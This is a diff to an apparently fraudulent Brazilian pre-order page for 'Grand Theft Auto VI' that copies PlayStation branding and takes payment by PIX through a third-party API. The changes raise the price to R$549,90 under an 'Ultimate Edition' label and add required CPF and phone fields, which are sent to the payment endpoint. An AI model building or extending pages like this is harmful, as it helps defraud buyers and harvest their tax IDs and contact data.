@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Grand Theft Auto VI - Pré-encomenda</title>
+<title>Grand Theft Auto VI: Ultimate Edition - Pré-encomenda</title>
 <link rel="stylesheet" href="playstation.com/css/font-all.css">
 <style>
 *, *::before, *::after { margin:0; padding:0; box-sizing:border-box }
@@ -392,13 +392,13 @@ body {
     </svg>
   </div>
 
-  <p class="tagline">Pré-encomenda</p>
-  <h1 class="title">GARANTA O SEU</h1>
-  <p class="subtitle">Pré-encomende agora e receba na data de lançamento</p>
+  <p class="tagline">Pré-encomenda • Ultimate Edition</p>
+  <h1 class="title">GARANTA A SUA</h1>
+  <p class="subtitle">Pré-encomende a Ultimate Edition agora e receba na data de lançamento</p>
 
   <div class="price-card">
-    <div class="price-label">Preço por cópia</div>
-    <div class="price-value">R$ <span class="price-cents">449</span><span style="font-size:20px">,90</span></div>
+    <div class="price-label">Preço por cópia - Ultimate Edition</div>
+    <div class="price-value">R$ <span class="price-cents">549</span><span style="font-size:20px">,90</span></div>
     <div class="price-sub">Pagamento via PIX • Confirmação instantânea</div>
     <div class="platform-tag">
       <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
@@ -415,7 +415,14 @@ body {
       <label for="email">E-mail</label>
       <input type="email" id="email" placeholder="seu@email.com" required autocomplete="email">
     </div>
-
+    <div class="form-group">
+      <label for="cpf">CPF</label>
+      <input type="text" id="cpf" placeholder="000.000.000-00" required inputmode="numeric" maxlength="14">
+    </div>
+    <div class="form-group">
+      <label for="phone">Telefone</label>
+      <input type="tel" id="phone" placeholder="(51) 12345-6789" required inputmode="numeric" maxlength="15">
+    </div>
     <button type="submit" class="btn-pay" id="btnPay">
       <span id="btnText">GERAR PIX PARA PAGAMENTO</span>
     </button>
@@ -424,7 +431,7 @@ body {
   <div class="pix-section" id="pixSection">
     <div class="check-icon">&#10003;</div>
     <h3>Pedido confirmado!</h3>
-    <p>Pague o PIX abaixo para garantir sua pré-encomenda</p>
+    <p>Pague o PIX abaixo para garantir sua pré-encomenda da Ultimate Edition</p>
     <div class="qr-placeholder" id="qrContainer">
       <div id="qrLoading" style="color:#888;font-size:13px">Carregando QR Code...</div>
     </div>
@@ -463,11 +470,27 @@ async function getToken() {
   return data.access_token;
 }
 
-async function createPixCashin(name, email, amount) {
+function maskCPF(v) {
+  return v.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2');
+}
+
+function maskPhone(v) {
+  return v.replace(/\D/g,'').replace(/(\d{2})(\d)/,'($1) $2').replace(/(\d{4,5})(\d{4})$/,'$1-$2');
+}
+
+document.getElementById('cpf').addEventListener('input', function(){
+  this.value = maskCPF(this.value);
+});
+
+document.getElementById('phone').addEventListener('input', function(){
+  this.value = maskPhone(this.value);
+});
+
+async function createPixCashin(name, email, cpf, phone, amount) {
   const body = {
     amount: amount,
-    description: 'GTA VI - Pré-encomenda',
-    client: { name, email, cpf: '00000000000', phone: '00000000000' }
+    description: 'GTA VI Ultimate Edition - Pré-encomenda',
+    client: { name, email, cpf: cpf.replace(/\D/g,''), phone: phone.replace(/\D/g,'') }
   };
   const res = await fetch(`${API_BASE}/cash-in`, {
     method: 'POST',
@@ -491,15 +514,17 @@ document.getElementById('checkoutForm').addEventListener('submit', async (e) => 
   const btnText = document.getElementById('btnText');
   const name = document.getElementById('name').value.trim();
   const email = document.getElementById('email').value.trim();
+  const cpf = document.getElementById('cpf').value.trim();
+  const phone = document.getElementById('phone').value.trim();
 
-  if (!name || !email) return;
+  if (!name || !email || !cpf || !phone) return;
 
   btn.disabled = true;
   btnText.innerHTML = '<span class="loading"></span> Gerando PIX...';
 
   try {
     accessToken = await getToken();
-    const result = await createPixCashin(name, email, cpf, phone, 449.90);
+    const result = await createPixCashin(name, email, cpf, phone, 549.90);
 
     document.getElementById('pixCodeText').textContent = result.pix_code;
 
